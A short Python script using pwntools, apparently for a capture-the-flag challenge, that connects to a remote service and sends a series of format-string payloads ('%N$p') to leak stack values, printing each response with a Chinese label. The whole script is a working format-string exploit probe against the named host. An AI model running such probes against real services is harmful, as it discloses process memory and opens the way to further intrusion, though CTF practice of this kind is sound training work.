from pwn import*

p = remote('yuanshen.life', 33933)
for i in range(0x50):
    p.recvuntil('And now let\'s start the game!!!\n')
    p.sendline('%' + str(i) + '$paaaa')
    out = p.recvuntil('aaaa')[:-4]
    print('发送' + str(i) + '时收到:[' + str(out) + ']')
p.close()

